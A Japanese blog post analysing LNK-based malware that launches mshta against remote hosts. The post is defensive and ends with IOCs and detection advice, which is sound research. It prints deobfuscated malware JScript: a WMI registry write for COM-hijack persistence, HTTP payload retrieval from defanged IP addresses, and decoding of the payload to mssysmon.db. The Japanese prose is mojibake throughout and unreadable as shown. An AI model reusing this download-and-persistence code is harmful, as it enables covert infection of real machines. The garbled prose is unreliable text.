# æœ€è¿‘æµè¡Œã‚Šã®Lnkãƒ•ã‚¡ã‚¤ãƒ«ãƒ™ãƒ¼ã‚¹ã®ãƒãƒ«ã‚¦ã‚§ã‚¢ã‚’èª¿ã¹ã‚‹

è¨˜äº‹åŸ·ç­†ã¯6/30ã§ã™ãŒã€6æœˆã«å…¥ã£ã¦ã®ãƒãƒ«ã‚¦ã‚§ã‚¢ã¯Emotetã‚‚å«ã‚Lnkãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹ã‚¿ã‚¤ãƒ—ã¨ã€MSã®è„†å¼±æ€§ã€Œ`Follina`ã€ã¨ã‹ãƒã‚¯ãƒ­ç³»ãŒå¤šã„ã¨æ€ã„ã¾ã™ã€‚  

æœ€è¿‘ã€AWSãªã©ã‚¤ãƒ³ãƒ•ãƒ©ç³»ã®æƒ…å ±ã°ã‹ã‚Šã‚ã’ã¦ã„ã¾ã—ãŸãŒã€ãã‚ãã‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç³»ã‚‚ã‚„ã‚ŠãŸã„ã®ã§ã€ä»Šå›ã¯ã“ã‚Œã‚’ã‚„ã£ã¦ã„ããŸã„ã¨æ€ã„ã¾ã™ã€‚  

### å¯¾è±¡ãƒãƒ«ã‚¦ã‚§ã‚¢  

å¯¾è±¡ã¯Twitterä¸Šã§å›ã£ã¦ããŸä»¥ä¸‹ã®ãƒãƒ«ã‚¦ã‚§ã‚¢ã§ã™ã€‚  
ã“ã‚Œã‚’é¸ã‚“ã ç†ç”±ã¯Emotetã¯ä¸€å›è¦‹ã¾ã—ãŸã—ã€æ­£ç›´æœ€åˆä»¥å¤–ã¯ãŸã„ã—ã¦å‹•ããŒå¤‰ã‚ã‚‰ãªã„ã®ã§ã€ãã‚Œä»¥å¤–ã§é¢ç™½ãã†ãªã‚‚ã®ãªã„ã‹ãªï¼Ÿã¨ã„ã†ã“ã¨ã§è¦‹ã¦ã„ãã¾ã—ãŸã€‚  

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">&quot;Online questionnaire-Exploring ways to cooperate with North Korea.rar&quot;: f50cd82717837a5b5fb985c8f080fa3d5cabb05b146aed14e3810ae90fb37e01<br>The .lnk in it: bffacbb0b54a3b1dd6f25686d2486d0a064f5e8eedefb4e572740f7b63ba4fa4<br>ğŸ¤”<a href="https://twitter.com/ShadowChasing1?ref_src=twsrc%5Etfw">@ShadowChasing1</a> <a href="https://twitter.com/h2jazi?ref_src=twsrc%5Etfw">@h2jazi</a> <a href="https://t.co/gKRv6mxQgx">pic.twitter.com/gKRv6mxQgx</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a href="https://twitter.com/malwrhunterteam/status/1541784815728459779?ref_src=twsrc%5Etfw">June 28, 2022</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


### ã©ã†å‹•ãã‹ï¼Ÿ  

ã–ã£ãã‚Šã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«å‹•ä½œã—ã¾ã™ã€‚  
ä½¿ã†ã‚‚ã®ã¯mshtaã‚’åˆ©ç”¨ã—ã¦æ”»æ’ƒã‚’è¡Œã„ã€mssysmon.dbã¨ã„ã†ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã€‚ã“ã‚Œã‚’å‹•ä½œã•ã›ã‚‹ã‚ˆã†ã«ãƒ¬ã‚¸ã‚¹ãƒˆãƒªæ“ä½œã‚’ã—ã¦ã„ã‚‹ã¨æ€ã‚ã‚Œã¾ã™ã€‚  

```mermaid
graph LR
    subgraph ãƒãƒ«ã‚¦ã‚§ã‚¢æŒ™å‹•
        obj4("å¤–éƒ¨ã‚³ãƒ¼ãƒ‰ã‚’å¼•æ•°ã¨ã—ãŸmshtaèµ·å‹•<br/>hxxp://82.221.129[.]104/k0201[.]txt")
        obj5(ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å–å¾—ã—<br/>mssysmon.dbã§ä¿å­˜)
        obj6("WMIã§ãƒ¬ã‚¸ã‚¹ãƒˆãƒªè¿½åŠ <br/>Software\Classes\CLSID\çœç•¥\InprocServer32")
    end
    subgraph ãƒ¡ãƒ¼ãƒ«
        obj1(æ”»æ’ƒè€…)
        obj2(RARãƒ•ã‚¡ã‚¤ãƒ«å—ä¿¡)
    end
    subgraph ãƒ¦ãƒ¼ã‚¶æ“ä½œ
        obj3(è§£å‡ã™ã‚‹ã¨LNKãƒ•ã‚¡ã‚¤ãƒ«<br/>Lnkãƒ•ã‚¡ã‚¤ãƒ«å®Ÿè¡Œ)
    end
    end1(ãƒãƒ«ã‚¦ã‚§ã‚¢å‹•ä½œé–‹å§‹)
    end2(ãƒãƒ«ã‚¦ã‚§ã‚¢å‹•ä½œçµ‚äº†)
    obj1-->obj2-->obj3-->end1
    obj4-->obj5-->obj6-->end2

```

### ã¾ãšã¯OSINTæƒ…å ±  

VirusTotalã§æƒ…å ±ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚  
Note: URLç­‰ã¯é›£èª­åŒ–ã—ã¾ã™  
ã¯ã˜ã‚è¦‹ãŸã¨ãã¯ã€10ç¤¾ã»ã©ã§ã—ãŸãŒã€ã•ã™ãŒã«ä½•æ—¥ã‹çµŒã£ã¦ã„ã¾ã™ã®ã§ã€çµæ§‹ãªãƒ¡ãƒ¼ã‚«ãƒ¼ãŒæ¤œçŸ¥ã—ã¦ã¾ã™ã€‚  

https://www.virustotal.com/gui/file/bffacbb0b54a3b1dd6f25686d2486d0a064f5e8eedefb4e572740f7b63ba4fa4

![æ¤œçŸ¥çŠ¶æ³](https://raw.githubusercontent.com/proshiba/analysis/main/lnkmalware//virustotal01.png)

Behaviorã‚’è¦‹ã¦ã„ãã¾ã™ã¨ã€ä»¥ä¸‹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå­˜åœ¨ã—ã€ã“ã‚Œã¯mshtaã‚’åˆ©ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚  
`hxxp://82.221.129[.]104/k0201[.]txt`

![mshtaã®å‹•ä½œ](https://raw.githubusercontent.com/proshiba/analysis/main/lnkmalware//virustotal02.png)

æ¤œçŸ¥å›é¿ã®ãƒˆãƒªãƒƒã‚¯ã¯ä½¿ã‚ã‚Œã¦ã¾ã™ãŒã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¦ã¾ã™ã€‚  

`mshta hxxp://82.221.129[.]104/k0201[.]txt`

æ¬¡ã¯ã“ã®URLã®å†…å®¹ã§ã™ã­ã€‚phishcheckã‚’ä½¿ã£ã¦å®Ÿéš›ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã¾ã™ã€‚  

https://phishcheck.me/179126/details

![ã‚¢ã‚¯ã‚»ã‚¹çµæœ](https://raw.githubusercontent.com/proshiba/analysis/main/lnkmalware//mshta01.png)

ã¤ã¾ã‚Šã€ä»Šåº¦ã¯ä»¥ä¸‹URLã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å–å¾—ã—ã¦ã„ã‚‹ã‚ã‘ã§ã™ã€‚  
`hxxp://82.221.129[.]104/k0201jo[.]txt`

ãªã‚‹ã»ã©ã€‚ãã†ãªã‚‹ã¨ä»Šåº¦ã¯ã“ã®URLã‚’è¦‹ã¦ã¿ã¾ã™ã€‚ãã†ã™ã‚‹ã¨ä»Šåº¦ã¯ãŠãã‚‰ãæ”»æ’ƒã‚³ãƒ¼ãƒ‰ã®å®Ÿä½“ãŒã‚ã‚Šã¾ã—ãŸã€‚  
ä»¥ä¸‹ã¯ã¨ã‚Šã‚ãˆãšã‚¤ãƒ³ãƒ‡ãƒ³ãƒˆã ã‘ã‚„ã£ãŸçŠ¶æ…‹ã§ã™ã€‚  

![æ”»æ’ƒã‚³ãƒ¼ãƒ‰ã®rawæƒ…å ±](https://raw.githubusercontent.com/proshiba/analysis/main/lnkmalware//mshta02.png)

ã¾ãå½“ãŸã‚Šå‰ã§ã™ãŒã€é›£èª­åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚  
ã“ã†ãªã‚‹ã¨ã€ä»Šåº¦ã¯ã“ã®é›£èª­åŒ–ã®è§£é™¤ãŒå¿…è¦ã«ãªã‚Šã¾ã™ã­ã€‚ã¡ãªã¿ã«ã“ã®å…ˆã®æŒ™å‹•ã‚‚ã‚ã‚‹ç¨‹åº¦ã¯virustotalã«ã‚‚ã®ã£ã¦ã¾ã™ãŒã€ã“ã“ã‹ã‚‰å…ˆã¯ã‚³ãƒ¼ãƒ‰è§£æã‚’ã—ãŸæ–¹ãŒã‚ˆã•ãã†ã§ã™ã€‚  

### ãƒãƒ«ã‚¦ã‚§ã‚¢ã‚³ãƒ¼ãƒ‰ã®è§£æ

åœ°é“ã«è§£èª­ã—ãŸçµæœã‚’`kaidoku.txt`ã¨ã—ã¦zipã§åœ§ç¸®ã—ã¦ä¿å­˜ã—ã¾ã—ãŸã€‚
Note: ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯infectedã«ã—ã¦ã¾ã™  

ãã“ã¾ã§é›£ã—ã„å†…å®¹ã«ã¯ãªã£ã¦ãªã„ã‚ˆã†ã§ã™ã€‚åŸºæœ¬çš„ã«æ–‡å­—åˆ—ã‚’ãƒãƒ©ãƒãƒ©ã«ã—ã¦é›£èª­åŒ–è§£é™¤ç”¨ã®é–¢æ•°ã‚’ä½¿ã£ã¦ã„ã‚‹å½¢ã§ã™ã­ã€‚
ã¡ãªã¿ã«å¤‰æ•°åã¨ã‹ã¯ã‚ã‹ã‚Šã‚„ã™ã„ã‚ˆã†ã«å¤‰æ›´ã¨ã‹ã‚‚è¡Œã£ã¦ã¾ã™ã€‚å…ƒã€…ã¯ã“ã‚“ãªã‚ã‹ã‚Šã‚„ã™ã„åç§°ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚  

ã¾ãšã€ã“ã®ã‚³ãƒ¼ãƒ‰ã«ãŠã„ã¦è¨€ã‚ã°mainé–¢æ•°ã¨ã„ãˆã‚‹ã‚‚ã®ã¯`IMG_CHECK`ã«ãªã‚Šã¾ã™ã€‚  

```js
IMG_CHECK()
```

è‰²ã€…ãªã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°ã¨é–¢æ•°ã‚’å®šç¾©ã—ãŸå¾Œã“ã®é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§æ‚ªæ€§æŒ™å‹•ãŒã‚¹ã‚¿ãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚  
ã§ã¯ã€æ¬¡ã«ã“ã®é–¢æ•°ã®å¤§ããªæµã‚Œã‚’è¿½ã£ã¦ã„ãã¾ã—ã‚‡ã†ã€‚  
ã–ã£ãã‚Šä»¥ä¸‹ã®ã‚ˆã†ã«å‹•ä½œã—ã¦ã„ã¾ã™ã€‚  

1. mshtaã®Windowã‚’æœ€å°ã«ã—ã¦ç”»é¢ç«¯ã«ç§»å‹•  
2. ãƒ•ã‚©ãƒ«ãƒ€1ã®ä½œæˆ(userdata\\qwe)
3. WMIã‚’åˆ©ç”¨ã—ã¦ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®è¿½åŠ 
4. HTTPã‚¢ã‚¯ã‚»ã‚¹(ã©ã†ã‚„ã‚‰statuscode=300ã‚’æ­£ã¨ã—ã¦ã„ã‚‹æ§˜ã§ã™)
5. inetcacheãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒã‚§ãƒƒã‚¯  
6. ãƒ•ã‚©ãƒ«ãƒ€1ã®`mssysmon[.]db`ã¨ã—ã¦ã‚³ãƒ”ãƒ¼
7. ãƒ•ã‚©ãƒ«ãƒ€ã”ã¨ã€ãƒ•ã‚©ãƒ«ãƒ€2ã«ç§»å‹•

ç‰¹å¾´çš„ãªã¨ã“ã‚ã¯ä»¥ä¸‹ã§ã—ã‚‡ã†ã‹ã€‚  

1. HTTPã‚¢ã‚¯ã‚»ã‚¹ã¯300(ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆç³»)ã«ãªã‚‹ã‚ˆã†ã«ã—ã¦ã„ã‚‹  
2. ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã¨ãƒ¬ã‚¸ã‚¹ãƒˆãƒªæ“ä½œã§çµ‚äº†ã—ã¦ã„ã‚‹  

ã“ã®ãŸã‚ã€æœ€åˆã®æ„ŸæŸ“æ™‚ã¯ã»ã¨ã‚“ã©æ‚ªæ€§æŒ™å‹•ã‚’ã—ã¦ã„ã¾ã›ã‚“ã€‚ã“ã‚Œã¯é‡è¦ãªã¨ã“ã‚ã§ã™ã­ã€‚  
ã•ã¦ã€ã„ãã¤ã‹å®Ÿéš›ã«ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¦ã„ãã¾ã—ã‚‡ã†ã€‚  
ã¾ãšã¯ã€URLã®å®šç¾©ãªã©ã‚’è¦‹ã¦ã„ãã¾ã™ã€‚

```js
    // çœç•¥
	folder_location="%appdata%\Microsoft\Internet Explorer\UserData\qwe";
	folder_location2="%appdata%\Microsoft\Internet Explorer\UserData\Temp"
	observer_url_32="hxxp://131[.]226[.]4[.]22/manager/VYtpPTc8UE2zG4dH[.]bmp";
	observer_url_64="hxxp://131[.]226[.]4[.]22/manager/JxQpe5T2nCn747UP[.]bmp";
    // çœç•¥
   	var f_loc  =dir_loc["concat"]("\\mssysmon[.]db");
	var f_loc2 =dir_loc2['concat']("\\mssysmon[.]db");
    var reg_inprocsvr32 ="Software\Classes\CLSID\{603D3801-BD81-11d0-A3A5-00C04FD706EC}\InprocServer32";
    // çœç•¥
```

ã“ã®è¾ºã‚ŠãŒãƒ•ã‚¡ã‚¤ãƒ«ä½œæˆå…ˆã‚„ãƒ¬ã‚¸ã‚¹ãƒˆãƒªæ“ä½œå¯¾è±¡ã€ã‚¢ã‚¯ã‚»ã‚¹å…ˆURLãªã©ã§ã™ã€‚  

ã•ã¦ã€ã¾ãšã¯ãƒ¬ã‚¸ã‚¹ãƒˆãƒªæ“ä½œé–¢é€£ã‚’è¦‹ã¦ã„ãã¾ã—ã‚‡ã†ã€‚ã“ã‚Œã¯`Write_Reg`ã¨ã„ã†é–¢æ•°ã§è¡Œã£ã¦ã„ã¾ã™ã€‚  
COMç³»ã®å‡¦ç†ã§ã™ã­ã€‚ã“ã‚ŒãŒæ°¸ç¶šç³»ã®å‡¦ç†ã¨ãªã‚‹ã¨æ€ã‚ã‚Œã¾ã™ã€‚  

```js
// Write_Reg(0x80000001, reg_inprocsvr32, cpu_arch, dir_loc2, f_loc2);
function Write_Reg(arg1, arg2, arg3, arg4, arg5){
	// SWbemã¯WMIé–¢é€£ã®æ“ä½œ
	SWbemValueSet=new ActiveXObject("WbemScripting.SWbemNamedValueSet");
	SWbemLocator=new ActiveXObject("WbemScripting.SWbemLocator");
	SWbemValueSet["Add"]("__ProviderArchitecture",arg3);
	var wmi_mypc_default=SWbemLocator["ConnectServer"](
					'',"root\\Default",'','','','',0x0,SWbemValueSet);
	var wmi_reg=wmi_mypc_default["Get"]("StdRegProv");
	var reg_create_op=wmi_reg['Methods_']("Createkey")['InParameters'];
	reg_create_op['Hdefkey']=arg1;
	reg_create_op["Ssubkeyname"]=arg2;
	wmi_reg['ExecMethod_']("Createkey", reg_create_op, 0x0, SWbemValueSet);
	reg_create_op=wmi_reg["Methods_"]("SetStringValue")["Inparameters"];
	reg_create_op['Hdefkey']=arg1;
	reg_create_op["Ssubkeyname"]=arg2;
	reg_create_op["Svalue"]=arg5;
	wmi_reg['ExecMethod_']("SetStringValue", reg_create_op, 0x0, SWbemValueSet);
}
```

ã“ã®ãŸã‚ã€ãƒ•ã‚¡ã‚¤ãƒ«ä½œæˆå‰ã«ã¾ãšã¯ãƒ¬ã‚¸ã‚¹ãƒˆãƒªç™»éŒ²ã ã‘ã‚„ã£ã¦ã„ã¾ã™ã€‚  
æ¬¡ã«URLã‚¢ã‚¯ã‚»ã‚¹ãŒã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯`Send_Query`ã§è¡Œã‚ã‚Œã¾ã™ã€‚ã“ã“ã‚’è¦‹ã‚‹ã¨ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã¯300ã§å¿œç­”ã•ã‚Œã‚‹ã®ã‚’æƒ³å®šã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚  

```js
function send_Query(arg1){
	var http_req=new ActiveXObject("WinHttp.WinHttpRequest.5.1"));
	var http_xml=new ActiveXObject("MSXML2.XMLHTTP.6.0");
	try{
		// 0x20 is x86. 0x40 is x64
		if(arg1==0x20){
			http_req["open"]("GET",observer_url_32,![]);
			http_req["send"]();
			if(http_req['status']>=0x12c){ // 12c is 300
				var res_hdr_loc=http_req["getResponseHeader"]("Location");
				http_xml["open"]("GET", res_hdr_loc,![]);
				http_xml["send"]();
			}else{
				http_xml["open"]("GET", observer_url_32,![]);
				http_xml["send"]();
			}
		}else{
			http_req["open"]("GET", observer_url_64,![]);
			http_req['send']();
			if(http_req["status"]>=0x12c){ // 12c is 300
				var res_hdr_loc=http_req["getResponseHeader"]("Location");
				http_xml["open"]("GET",res_hdr_loc,![]);
				http_xml["send"]();
			}else{
				http_xml["open"]("GET",observer_url_64,![]);
				http_xml["send"]();
			}
		}
	}catch(_0x1a4e1f){
		window["close"]();
	}
}
```

ãŸã ã€ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ãŒ300ã‚’æƒ³å®šã—ã¦ã„ã‚‹ä»¥ä¸Šã€ãŠãã‚‰ãå‡¦ç†ã¯å®Œäº†ã¨ã¯ãªã‚Šã¾ã›ã‚“ã€‚ãã®ãŸã‚ã€inetcacheãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã€‚  
æ¬¡ã¯inetcacheå†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¦ã€å­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹å‡¦ç†ãŒè¡Œã‚ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯`FIND_FILE`ã¨ã„ã†é–¢æ•°ã§å‡¦ç†ã•ã‚Œã¦ã„ã¾ã™ã€‚  
```js
function FIND_FILE(arg1){
	try{
		var INetCache1=wShell["ExpandEnvironmentStrings"]("%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5");
		var INetCache2=wShell["ExpandEnvironmentStrings"]("%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE");
		var path_list=arg1['split']('/');
		var path_count=0x2;
		var _0x1b83a4='';
		while(path_list[path_count]){
			path_count++;
		}
		var lastpath=path_list[path_count-0x1];
		fnamelist=lastpath[split]('.');
		var find_result=R_FIND(INetCache2,fnamelist[0x0]);
		if(find_result!=''){
			return find_result;
		}else{
			find_result=R_FIND(INetCache1,fnamelist[0x0]);
			if(find_result!=''){
				return find_result;
			}else{
				return '';
			}
		}
	}catch(_0x14b351){
		window["close"]();
	}
}
```

ã“ã®é–¢æ•°ã§ãƒ•ã‚¡ã‚¤ãƒ«åãŒåˆ¤æ˜ã—ã€ãã‚Œã‚’ä½¿ã£ã¦`SIZE_CHECK`ã¨ã„ã†é–¢æ•°ã‚’ä½¿ã£ã¦ãƒ†ãƒ³ãƒãƒ©ãƒªç”¨ãƒ•ã‚©ãƒ«ãƒ€(ãƒ•ã‚©ãƒ«ãƒ€1)ã«ä¿å­˜ã—ã¾ã™ã€‚  
ãŸã ã€ã“ã®æ™‚ã«ã¡ã‚‡ã£ã¨ã—ãŸãƒˆãƒªãƒƒã‚¯ãŒä½¿ã‚ã‚Œã¦ã„ã¾ã™ã€‚ãŠãã‚‰ãå…ƒã€…ã¯ãƒ†ã‚­ã‚¹ãƒˆãƒ‡ãƒ¼ã‚¿ã¨ãªã£ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã¦ãƒã‚¤ãƒŠãƒªã«ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚  

```js
function SIZE_CHECK(arg1, arg2){
	try{
		var raw_txtdata;
		try{
			raw_txtdata=fso["OpenTextFile"](arg1,0x1,!![],-0x1);
		}catch(_0xc28659){
			return 0x0;
		}
		var fsize1=fso["getfile"](arg1)["size"];
		var txtinfo=raw_txtdata["Read"](fsize1/0x2);
		// decode filedata
		var decode_size=(txtinfo["charCodeAt"](0x1)&0xffff)+(txtinfo['charCodeAt'](0x2)&0xffff)*0x10000;
		var decode_data=(txtinfo["charCodeAt"](0x1c)&0xffff)+(txtinfo['charCodeAt'](0x1d)&0xffff)*0x10000;
		if(fsize1!=decode_size){
			return 0x0;
		}else{
			COPY_FILE(txtinfo, decode_data, arg2);
			return 0x1;
		}
	}catch(_0x38917d){
		return 0x0;
	}
}
```

ã•ã¦ã€ã“ã‚Œã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ãŒå®Œäº†ã§ã™ã€‚ãƒ†ãƒ³ãƒãƒ©ãƒªãƒ•ã‚©ãƒ«ãƒ€ã‹ã‚‰æœ¬æ¥ã®ãƒãƒ«ã‚¦ã‚§ã‚¢ã«ç§»å‹•ã•ã›ãŸã‚‰å®Œäº†ã§ã™ã€‚  

```js
SIZE_CHECK(inetcach_file, f_loc);
try{
    fso['MoveFolder'](dir_loc, dir_loc2);
}catch(_0xf01aa6){
    window["close"]();
}
window["close"]();
```

ã•ã¦ã€ã“ã‚Œã§çµ‚äº†ã§ã™ã€‚ã“ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒãƒ«ã‚¦ã‚§ã‚¢ã®å†…å®¹ã¾ã§ã¯ç§ã®æ–¹ã§ã¯è§£æã¯è¡Œã£ã¦ã„ã¾ã›ã‚“ã€‚  

### çµ‚ã‚ã‚Šã«

mshtaã‚’ä½¿ã£ãŸãƒãƒ«ã‚¦ã‚§ã‚¢ã¯ã¨ã¦ã‚‚å¤šã„ã®ã§ã€å€‹äººçš„ã«ã¯mshtaã¯ä½¿ã‚ãªã„æ–¹ãŒã„ã„ã®ã§ã¯ãªã„ã‹ãªã€ã¨æ€ã£ã¦ã¾ã™ã€‚
ã§ãã‚Œã°ã€èµ·å‹•ã§ããªã„ã‚ˆã†ã«ã™ã‚‹ã¨ã‹mshtaã‹ã‚‰ã®å¤–éƒ¨ã‚¢ã‚¯ã‚»ã‚¹ã‚’ç¦æ­¢ã™ã‚‹ã€ã¾ãŸã¯æœ€ä½ã§ã‚‚mshtaã®å¼•æ•°ã«**http**ãŒã‚ã£ãŸã‚‰æ¤œå‡ºã™ã‚‹ãªã©ã‚’ã—ãŸæ–¹ãŒã„ã„ã¨æ€ã„ã¾ã™ã­ã€‚  

ã‚ã¨ã€å€‹äººçš„ã«ã¯COMç³»ï¼ˆCOMãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã¨ã‹ï¼‰ã®å‹•ä½œã‚’ã‚ã¾ã‚Šè©³ã—ããªã„ã®ã§ã™ã‚ˆã­ã€‚ã€‚ã“ã®è¾ºã‚Šã¯å‹‰å¼·ãŒå¿…è¦ã ãªã€ã¨ç—›æ„Ÿã—ã¾ã™ã€‚  

æœ€å¾Œã«ã€IOCæƒ…å ±ã‚’ã¾ã¨ã‚ã¦ãŠãã¾ã™ã€‚  
ã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸã€‚

### IOCæƒ…å ±

* IPã‚¢ãƒ‰ãƒ¬ã‚¹  
```
131[.]226[.]4[.]22
82[.]221[.]129[.]104
```

* URL  
```
hxxp://82[.]221[.]129[.]104/k0201[.]txt
hxxp://82[.]221[.]129[.]104/k0201jo[.]txt
```

* ãƒ•ã‚¡ã‚¤ãƒ«å  
```
%appdata%\Microsoft\Internet Explorer\UserData\qwe\mssysmon[.]db
%appdata%\Microsoft\Internet Explorer\UserData\Temp\mssysmon[.]db
```

* ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒƒã‚·ãƒ¥  
```
lnkãƒ•ã‚¡ã‚¤ãƒ«: bffacbb0b54a3b1dd6f25686d2486d0a064f5e8eedefb4e572740f7b63ba4fa4
bmpãƒ•ã‚¡ã‚¤ãƒ«: a995f4e4e5bec985ea974dac2a65056e7ab9f2b80430d94857530bedef5e74f6
mssysmon.db: edec420761cd95ba706c9f50f29bbb76786d5279c4ada162f513e0cb1fa4cf84
```
Note: virustotalã®æƒ…å ±ã‚’ã¾ã¨ã‚ãŸã ã‘ã§ã™ã€‚  

* ãƒ¬ã‚¸ã‚¹ãƒˆãƒª  
```
ã‚­ãƒ¼ï¼šSoftware\Classes\CLSID\{603D3801-BD81-11d0-A3A5-00C04FD706EC}\InprocServer32
Hdefkey=0x80000001
Ssubkeyname="%appdata%\Microsoft\Internet Explorer\UserData\Temp"
Svalue=mssysmon[.]db
```

### å‚è€ƒã‚µã‚¤ãƒˆ
* https://www.virustotal.com/gui/file/edec420761cd95ba706c9f50f29bbb76786d5279c4ada162f513e0cb1fa4cf84
* https://passing.breeze.cc/mt/archives/2009/07/jscript-wmi.html
* https://docs.microsoft.com/ja-jp/windows/win32/wmisdk/constructing-inparameters-objects
* https://phishcheck.me/179126/details

